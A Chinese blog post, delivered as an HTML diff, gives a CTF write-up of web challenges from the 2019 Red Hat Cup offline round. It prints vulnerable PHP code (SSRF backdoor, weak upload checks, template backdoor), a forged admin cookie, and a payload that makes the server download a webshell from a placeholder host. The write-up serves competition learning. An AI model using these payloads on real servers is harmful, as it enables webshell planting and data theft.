@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太理想，题目也都比较基础，可惜没都做出来，打到下午三点左右..状态差到快睡着了….，这篇文章是这场线下的一些个人总结，也是新的学习生活的开始(每次都要靠剪卡尺来摆脱某些感情问题…真希望以后不会被感情问题所困扰…做一个莫得感情的人吧，emm，这应该真的是最后一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019红帽杯线下题目漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="前言最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太理想，题目也都比较基础，可惜没都做出来，打到下午三点左右..状态差到快睡着了….，这篇文章是这场线下的一些个人总结，也是新的学习生活的开始(每次都要靠剪卡尺来摆脱某些感情问题…真希望以后不会被感情问题所困扰…做一个莫得感情的人吧，emm，这应该真的是最后一">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/26/MxyhE8.md.png">
+<meta property="article:published_time" content="2019-11-26T04:21:55.000Z">
+<meta property="article:modified_time" content="2019-11-26T04:22:34.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/26/MxyhE8.md.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/26/2019红帽杯线下题目漏洞分析/"/>
+
+
+
+
+
+  <title>2019红帽杯线下题目漏洞分析 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019红帽杯线下题目漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-26T12:21:55+08:00">
+                2019-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太理想，题目也都比较基础，可惜没都做出来，打到下午三点左右..状态差到快睡着了….，这篇文章是这场线下的一些个人总结，也是新的学习生活的开始(每次都要靠剪卡尺来摆脱某些感情问题…真希望以后不会被感情问题所困扰…做一个莫得感情的人吧，emm，这应该真的是最后一次尝试了，不过失败的有点可笑，还是专心于做事吧，少想一些有的没的)</p>
+<h3 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h3><p>题目本身存在Tp5的rce，感觉大家都是TPscan一把梭的，当时做出来了就没怎么审这道题的源码，看放的wp，还是存在很多漏洞的，这里说一下</p>
+<h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><p>Home\Controller\test.php中dlfile函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dlfile</span><span class="params">($file_url, $save_to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$file_url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $file_content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $downloaded_file = fopen($save_to, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($downloaded_file, $file_content);</span><br><span class="line">        fclose($downloaded_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数看起来有点像内置后门，我们可以控制两个参数，可以控制curl的对象和返回结果储存的地方</p>
+<p>源码中还贴心的给了payload(- -</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; &#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;http:&#x2F;&#x2F;xxxx&#x2F;shell.txt&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#x2F;&#x2F;&#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\Uploadify.php中preview函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preview</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">// 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line">		$DIR = <span class="string">'preview'</span>;</span><br><span class="line">		<span class="comment">// Create target dir</span></span><br><span class="line">		<span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">			@mkdir($DIR);</span><br><span class="line">		&#125;</span><br><span class="line">	$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">	$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">			$tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line">			<span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">			<span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">				@unlink($tmpfilePath);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		closedir($dir);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line">		$previewUrl = sprintf(</span><br><span class="line">				<span class="string">"%s://%s%s"</span>,</span><br><span class="line">				<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">				$_SERVER[<span class="string">'HTTP_HOST'</span>],$_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">		);</span><br><span class="line">		$previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line">		$base64 = $matches[<span class="number">2</span>];</span><br><span class="line">		$type = $matches[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>) &#123;</span><br><span class="line">			$type = <span class="string">'jpg'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strtolower($type)==<span class="string">'php'</span>)&#123;</span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">'hacked!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">		$filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$data = base64_decode($base64);</span><br><span class="line">			file_put_contents($filePath, $data);</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在漏洞的原因是…检测后缀太少了，就检测个php,有点像web2的那个附件上传的检测，有点虚假</p>
+<p>代码大概逻辑：</p>
+<p>首先建立下文件储存的preview文件夹</p>
+<p>通过php://input，接受通过data协议传进来的文件，并且这个判断中判断了php，随便换成phtml或者其他的就行，最终写入previeww文件夹下，访问拿到shell,看先知的wp说后台存在弱口令，进去同样的文件上传漏洞，这里就不赘述了。</p>
+<h3 id="粤湾投资"><a href="#粤湾投资" class="headerlink" title="粤湾投资"></a>粤湾投资</h3><p>emmm..比赛的时候还真没看见log的泄露orz..，这题存在传统的display的问题…（出题人的后门</p>
+<p>Home\JqueryController.class.php中index函数</p>
+<h4 id="display后门"><a href="#display后门" class="headerlink" title="display后门"></a>display后门</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">JqueryController</span> <span class="keyword">extends</span> <span class="title">CommonController</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 首页</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'template_file'</span>])) &#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;seoData = <span class="keyword">array</span>(<span class="string">'title'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'keywords'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'description'</span> =&gt; <span class="string">'Jquery插件'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;display();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;display($_GET[<span class="string">'template_file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显可以通过控制template_file去调用display拿到文件的内容返回</p>
+<p>调用链为：display-&gt;Home\display-&gt;parseTemplate-&gt;view\display-&gt;fetch-&gt;listen-&gt;run-&gt;fetch-&gt;loadTemplate-&gt;compiler-&gt;put-&gt;load(PS:这是代码执行的调用)</p>
+<p>调用链中还是少了几步的，写的是一些相对关键的调用</p>
+<h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\UploadfileController.class.php 中 index函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(IS_POST)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * 1、如果是图片直接调用uploadPhoto()</span></span><br><span class="line"><span class="comment">		 * 2、如果是替他附件则按照当前配置设置</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		$type = I(<span class="string">'post.type'</span>,<span class="string">'files'</span>);</span><br><span class="line">		$saveDir = I(<span class="string">'post.savedir'</span>);</span><br><span class="line">		$thumbw = I(<span class="string">'post.thumbw'</span>);</span><br><span class="line">		$thumbh = I(<span class="string">'post.thumbh'</span>);</span><br><span class="line">		$filesize = I(<span class="string">'post.filesize'</span>);</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">'images'</span> || preg_match(<span class="string">'/^image\//'</span>, $_FILES[<span class="string">'Filedata'</span>][<span class="string">'type'</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">			$type = <span class="string">"images"</span>;</span><br><span class="line">			<span class="comment">//是否添加水印</span></span><br><span class="line">			$water = I(<span class="string">'post.water'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>($water)&#123;</span><br><span class="line">				$water_site = C(<span class="string">'SITE_SYSTEM_IMG_WATER'</span>);</span><br><span class="line">				$water_new = <span class="keyword">isset</span>($water_site) &amp;&amp; !<span class="keyword">empty</span>($water_site) ? $water_site : C(<span class="string">'SYSTEM_IMG_WATER'</span>);</span><br><span class="line">			    <span class="comment">//$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=&gt;1));</span></span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,$water_new,$filesize);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,<span class="string">''</span>,$filesize);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!is_array($info))&#123;</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $info;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$file[<span class="string">'oringinal_type'</span>] = <span class="string">'images'</span>;</span><br><span class="line">			$file[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">			$file[<span class="string">'name'</span>] = $_FILES[<span class="string">'Filedata'</span>][<span class="string">'name'</span>][<span class="number">0</span>];</span><br><span class="line">			$file[<span class="string">'savename'</span>] = $info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'photo'</span>] = substr($info[<span class="number">0</span>][<span class="string">'savepath'</span>],<span class="number">1</span>).$info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'thumb'</span>] = $info[<span class="number">0</span>][<span class="string">'thumbpath'</span>];</span><br><span class="line">			$file[<span class="string">'location'</span>] = <span class="string">'upload'</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;ajaxReturn($file);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$type = <span class="string">'files'</span>;</span><br><span class="line">			$upload = <span class="keyword">new</span> \Think\Upload();</span><br><span class="line">			$upload-&gt;maxSize = $filesize*<span class="number">1024</span>; <span class="comment">//文件上传的最大文件大小，附件最大100M</span></span><br><span class="line">			$upload-&gt;rootPath = <span class="string">"./"</span>; <span class="comment">//文件上传保存的根路径</span></span><br><span class="line">			$upload-&gt;savePath = $upload-&gt;rootPath.<span class="string">"Public/Uploads/"</span>.$saveDir.<span class="string">"/"</span> . $type .<span class="string">"/"</span>;<span class="comment">//文件上传的保存路径</span></span><br><span class="line">			$upload-&gt;saveName = date(<span class="string">"YmdHis"</span>).<span class="string">"_"</span>.uniqid(); <span class="comment">//上传文件的保存规则</span></span><br><span class="line">			$upload-&gt;replace = <span class="keyword">true</span>; <span class="comment">//存在同名文件是否是覆盖</span></span><br><span class="line">			$upload-&gt;autoSub = <span class="keyword">true</span>;<span class="comment">//自动使用子目录保存上传文件</span></span><br><span class="line">			$upload-&gt;subName = date(<span class="string">"Ymd"</span>);<span class="comment">//子目录创建方式，采用数组或者字符串式定义</span></span><br><span class="line">			$upload-&gt;hash = <span class="keyword">true</span>;<span class="comment">//是否生成文件的hash编码 默认为true</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!$info = $upload-&gt;upload())&#123;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;方</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $upload-&gt;getError();</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">//处理文件图标</span></span><br><span class="line">				<span class="comment">//excel</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'xls'</span>,<span class="string">'xlsx'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'xls'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>两种上传操作，第一种是为了图片的上传，第二种是其他文件的上传，没有任何过滤，不过比赛的时候这道题的路由错了….，改下路由即可上传拿到shell</p>
+<h3 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h3><h4 id="重装-后台getshell-非预期"><a href="#重装-后台getshell-非预期" class="headerlink" title="重装+后台getshell(非预期)"></a>重装+后台getshell(非预期)</h4><p>存在install.php，重装后进入后台，有多种途径可getshell</p>
+<h4 id="cookie伪造-后台getshell-预期"><a href="#cookie伪造-后台getshell-预期" class="headerlink" title="cookie伪造+后台getshell(预期)"></a>cookie伪造+后台getshell(预期)</h4><p>官方做法：</p>
+<p>/admin/plugin.php</p>
+<p>伪造：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EM_AUTHCOOKIE_W5ybaCEXHdrHWkYBR6bvBATPe8K9inQP=admin%7C%7Ce13aca594aae3d6240938911ac7257f7;</span><br></pre></td></tr></table></figure>
+
+<p>利用：</p>
+<p>然后在后台系统，插件管理处可以上传压缩包格式的插件，需要上传文件夹名和文件名相同的内容的压缩包，而且是 php 文件，因此可以构造以下形式的压缩包上传生成后门然后访问/content/plugins/1/1.php，读取flag：</p>
